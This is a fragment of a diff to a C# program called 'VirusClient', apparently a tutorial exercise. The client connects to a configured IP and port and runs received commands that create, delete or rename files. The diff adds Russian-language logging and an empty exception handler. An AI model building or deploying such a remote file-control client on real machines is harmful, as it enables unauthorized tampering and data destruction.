@@ -14,6 +14,11 @@ namespace VirusClient
         //https://www.youtube.com/watch?v=RgQ4_XJ6NbU&t=451s
         static void Main(string[] args)
         {
+            string log = "Журнал событий \t\n";
+            try
+            {
+
+             
             IPAddress address = IPAddress.Parse(Properties.Settings.Default.IP); //Получаем текущий адрес из настроек приложени(параметров)
             int port = Properties.Settings.Default.Port; // порт подключения
             IPEndPoint endPoint = new IPEndPoint(address,port); // точка соединения с программой
@@ -36,22 +41,30 @@ namespace VirusClient
                     case "create":
                         FileStream stream = File.Create(command[1]); //создаем файл по указанном пути в массиве command[1]
                         stream.Close();
+                         log += "Сработал метод create \t\n";
                         break;
 
                     case "delete":
                         File.Delete(command[1]); // удаление
-                        break;
+                            log += "Сработал метод delete \t\n";
+                            break;
 
                     case "rename":
                         File.Replace(command[1],command[2],""); // удаление
-                        break;
+                            log += "Сработал метод rename \t\n";
+                            break;
                 }
 
                     
             }
-             
 
 
+            }
+
+            catch (Exception ex)
+            {
+
+            }
 
         }
     }
